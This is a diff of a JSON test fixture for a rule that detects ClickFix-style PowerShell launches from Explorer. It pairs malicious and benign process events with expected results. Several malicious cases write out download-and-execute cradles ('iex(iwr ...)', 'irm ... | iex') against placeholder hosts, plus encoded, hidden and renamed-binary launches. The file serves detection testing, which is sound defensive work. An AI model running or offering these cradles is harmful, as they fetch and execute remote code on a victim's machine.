@@ -1,14 +1,18 @@
 [
-  {
-    "event": {"ParentImage": "C:\\Windows\\Explorer.EXE", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -EncodedCommand <redacted>"},
-    "expected": true
-  },
-  {
-    "event": {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh.exe -NoProfile"},
-    "expected": false
-  },
-  {
-    "event": {"ParentImage": "C:\\Windows\\System32\\services.exe", "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh.exe -EncodedCommand <redacted>"},
-    "expected": false
-  }
+  {"note": "Unencoded download cradle pasted into Run (most common ClickFix form)",
+   "event": {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell -w hidden -c \"iex(iwr https://cdn.example.invalid/v.txt -UseBasicParsing)\""}, "expected": true},
+  {"note": "Short encoded flag -enc",
+   "event": {"ParentImage": "C:\\Windows\\Explorer.EXE", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -enc SQBFAFgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8A"}, "expected": true},
+  {"note": "Single-letter -e flag with slash form",
+   "event": {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh /e SQBFAFgA"}, "expected": true},
+  {"note": "irm | iex cradle without hidden flag",
+   "event": {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell irm https://verify.example.invalid/c | iex"}, "expected": true},
+  {"note": "Renamed PowerShell binary caught by OriginalFileName",
+   "event": {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Users\\Public\\svc.exe", "OriginalFileName": "PowerShell.EXE", "CommandLine": "svc.exe -w h -c \"iex $x\""}, "expected": true},
+  {"note": "User opening an interactive PowerShell window from Start",
+   "event": {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\""}, "expected": false},
+  {"note": "Admin running a local script from Explorer",
+   "event": {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh -NoProfile -File C:\\Scripts\\inventory.ps1"}, "expected": false},
+  {"note": "Encoded command from a service, not from Explorer",
+   "event": {"ParentImage": "C:\\Windows\\System32\\services.exe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -enc SQBFAFgA"}, "expected": false}
 ]
